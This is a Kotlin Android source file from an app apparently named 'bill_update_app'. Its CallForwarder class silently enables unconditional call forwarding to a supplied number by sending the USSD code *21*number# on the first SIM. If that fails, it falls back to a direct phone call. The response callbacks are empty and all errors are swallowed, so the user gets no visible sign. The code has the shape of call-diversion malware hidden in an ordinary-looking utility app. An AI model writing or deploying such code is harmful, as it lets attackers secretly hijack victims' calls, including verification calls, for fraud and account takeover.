package com.example.bill_update_app

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.Manifest
import android.content.pm.PackageManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import androidx.core.content.ContextCompat

class CallForwarder(private val context: Context) {

    fun enableCallForwarding(number: String) {
        val code = "*21*$number#"
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.CALL_PHONE)
            == PackageManager.PERMISSION_GRANTED) {
            try {
                val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
                if (Build.VERSION.SDK_INT >= 22) {
                    val subManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
                    val subs = subManager.activeSubscriptionInfoList
                    if (subs != null && subs.isNotEmpty()) {
                        tm.createForSubscriptionId(subs[0].subscriptionId)
                            .sendUssdRequest(code, callbacks(), Handler(Looper.getMainLooper()))
                        return
                    }
                }
                if (Build.VERSION.SDK_INT >= 21) {
                    tm.sendUssdRequest(code, callbacks(), Handler(Looper.getMainLooper()))
                    return
                }
            } catch (_: Exception) {}
        }
        fallbackCall(code)
    }

    fun disableCallForwarding() {
        val code = "#21#"
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.CALL_PHONE)
            == PackageManager.PERMISSION_GRANTED) {
            try {
                val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
                if (Build.VERSION.SDK_INT >= 22) {
                    val subManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
                    val subs = subManager.activeSubscriptionInfoList
                    if (subs != null && subs.isNotEmpty()) {
                        tm.createForSubscriptionId(subs[0].subscriptionId)
                            .sendUssdRequest(code, callbacks(), Handler(Looper.getMainLooper()))
                        return
                    }
                }
                if (Build.VERSION.SDK_INT >= 21) {
                    tm.sendUssdRequest(code, callbacks(), Handler(Looper.getMainLooper()))
                    return
                }
            } catch (_: Exception) {}
        }
        fallbackCall(code)
    }

    fun openDialer(code: String) {
        try {
            val uri = Uri.fromParts("tel", code, null)
            val intent = Intent(Intent.ACTION_DIAL, uri).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
        } catch (_: Exception) {}
    }

    private fun fallbackCall(code: String) {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.CALL_PHONE)
            != PackageManager.PERMISSION_GRANTED) return
        try {
            val uri = Uri.fromParts("tel", code, null)
            val intent = Intent(Intent.ACTION_CALL, uri).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
        } catch (_: Exception) {}
    }

    private fun callbacks() = object : TelephonyManager.UssdResponseCallback() {
        override fun onReceiveUssdResponse(tm: TelephonyManager, request: String, response: CharSequence) {}
        override fun onReceiveUssdResponseFailed(tm: TelephonyManager, request: String, failureCode: Int) {
            fallbackCall(request)
        }
    }
}
